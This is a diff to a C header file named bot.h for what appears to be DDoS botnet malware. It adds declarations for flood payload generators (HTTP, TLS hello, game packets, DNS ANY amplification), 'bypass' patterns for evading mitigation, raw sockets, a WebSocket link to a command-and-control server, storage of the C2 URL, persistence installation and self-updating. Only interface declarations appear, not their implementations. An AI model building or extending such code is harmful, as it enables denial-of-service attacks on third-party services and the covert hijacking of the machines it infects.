@@ -37,8 +37,7 @@
 #include <zlib.h>
 
 /* ── Constants ─────────────────────────────────── */
-#define MAX_PAYLOAD 65507  /* max UDP payload (64K - headers) */
-/* MEGA: base power — 65535 sockets, 1024 batch, 128MB buf, ZC */
+#define MAX_PAYLOAD 65507
 #define MEGA_BATCH_MAX 4096
 #define MEGA_SOCKS_PER_CPU 512
 #define MEGA_MAX_SOCKS 65535
@@ -94,7 +93,7 @@ extern volatile int g_attack_active;
 extern char g_bot_uuid[64];
 extern char g_cur_task_id[64];
 
-/* Atomic attack-state helpers (x86/ARM memory barriers via GCC builtins) */
+/* Atomic attack-state helpers */
 static inline void request_attack_stop(void) {
     __sync_lock_test_and_set(&g_attack_stop, 1);
 }
@@ -112,7 +111,6 @@ static inline int is_attack_active(void) {
     return __sync_fetch_and_add(&g_attack_active, 0);
 }
 
-/* Inline helpers for atomic counters (thread-safe without mutex) */
 static inline void pkt_sent(int bytes) {
     __sync_fetch_and_add(&g_pkt_count, 1ULL);
     __sync_fetch_and_add(&g_byte_count, (unsigned long long)(bytes > 0 ? bytes : 1));
@@ -122,5 +120,84 @@ typedef struct {
     AttackParams atk;
     Config *cfg;
 } BgAttackCtx;
+
+/* ── payload ───────────────────────────────────── */
+void gen_payloads(void);
+void gen_http(unsigned char *buf, int *len, const char *host);
+void gen_tls_hello(unsigned char *buf, int *len, const char *sni);
+void gen_game_pkt(unsigned char *buf, int *len);
+void encrypt_payload(unsigned char *buf, int len);
+void obfuscate_payload(unsigned char *buf, int len);
+uint32_t rand_vn_ip(void);
+
+extern unsigned char g_payloads[MAX_PAYLOADS][MAX_PAYLOAD];
+extern int g_payload_lens[MAX_PAYLOADS];
+extern int g_total_payloads;
+extern const unsigned char DNS_ANY_PAYLOAD[];
+extern const size_t DNS_ANY_LEN;
+
+typedef struct {
+    char name[64];
+    char payload[256];
+    int length;
+    int effectiveness;
+    int category;
+} bypass_pattern_t;
+
+extern const bypass_pattern_t enhanced_bypass_patterns[];
+extern const int num_bypass_patterns;
+
+int select_optimal_bypass_pattern(int burst_count, int consecutive_failures);
+void generate_smart_bypass_payload(unsigned char *buffer, int burst_count, int consecutive_failures);
+void generate_enhanced_bypass_payload(unsigned char *buffer, int pattern_idx);
+
+/* ── cpu_gov ───────────────────────────────────── */
+int get_cpu_usage(void);
+void update_cpu_load(void);
+int should_pause(void);
+void cpu_monitor_start(void);
+
+/* ── sock_util ─────────────────────────────────── */
+int create_udp_socket(void);
+int create_raw_socket(int proto);
+int create_bypass_socket(void);
+uint16_t ip_csum(void *d, size_t l);
+uint16_t tcp_csum(void *ip, void *tcp);
+
+/* ── ws_client ─────────────────────────────────── */
+typedef struct {
+    int sockfd;
+    SSL *ssl;
+    SSL_CTX *ctx;
+    char host[256], path[256];
+    int port, use_ssl;
+    pthread_mutex_t io;
+    unsigned char rbuf[8192];
+    int rbuf_len;
+    int rbuf_off;
+} WS;
+
+int ws_connect(WS *ws, const char *bot_id);
+void ws_disconnect(WS *ws);
+int ws_send(WS *ws, const char *msg);
+int ws_recv(WS *ws, char *buf, int cap);
+
+/* ── attack ────────────────────────────────────── */
+void *bg_attack_thread(void *arg);
+
+/* ── sysinfo ───────────────────────────────────── */
+void sys_info(SysInfo *info);
+void gen_uuid_v4(char *out, int cap);
+void get_bot_uuid(char *out, int cap);
+
+/* ── json ──────────────────────────────────────── */
+int json_int(const char *msg, const char *key);
+void json_str(const char *msg, const char *key, char *out, int cap);
+
+/* ── daemon ────────────────────────────────────── */
+void save_c2_url(const char *url);
+int load_c2_url(char *out, int cap);
+void install_persistence(const char *self_path);
+void check_updates(const char *current_tag);
 
 #endif /* BOT_H */
